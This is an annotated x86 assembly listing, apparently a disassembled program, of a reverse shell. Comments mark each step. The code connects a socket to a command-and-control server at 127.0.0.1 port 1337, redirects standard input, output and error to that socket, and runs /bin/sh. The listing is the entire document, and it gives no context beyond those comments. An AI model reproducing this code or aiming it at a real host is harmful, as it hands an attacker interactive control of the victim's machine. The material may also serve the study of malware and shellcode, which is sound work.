# Connect to C&C Server on localhost aka 127.0.0.1 and on port 1337
add    ebx,0x2e20
sub    esp,0x4
push   0x0
push   0x1
push   0x2
call   1060 # <socket@plt>
add    esp,0x10
mov    DWORD PTR [ebp-0xc],eax
mov    DWORD PTR [ebp-0x1c],0x0
mov    DWORD PTR [ebp-0x18],0x0
mov    DWORD PTR [ebp-0x14],0x0
mov    DWORD PTR [ebp-0x10],0x0
mov    WORD PTR [ebp-0x1c],0x2
mov    DWORD PTR [ebp-0x18],0x100007f
mov    WORD PTR [ebp-0x1a],0x3905
sub    esp,0x4
push   0x10
lea    eax,[ebp-0x1c]
push   eax
push   DWORD PTR [ebp-0xc]
call   1070 # <connect@plt>
add    esp,0x10
# Redirect STDIN to the socket
sub    esp,0x8
push   0x0
push   DWORD PTR [ebp-0xc]
call   1030 # <dup2@plt>
add    esp,0x10
# Redirect STDOUT to the socket
sub    esp,0x8
push   0x1
push   DWORD PTR [ebp-0xc]
call   1030 # <dup2@plt>
add    esp,0x10
# Redirect STDERR to the socket
sub    esp,0x8
push   0x2
push   DWORD PTR [ebp-0xc]
call   1030 # <dup2@plt>
add    esp,0x10
# Execute /bin/sh
sub    esp,0x8
push   0x0
lea    eax,[ebx-0x1ff8]
push   eax
call   1050 # <execv@plt>
add    esp,0x10
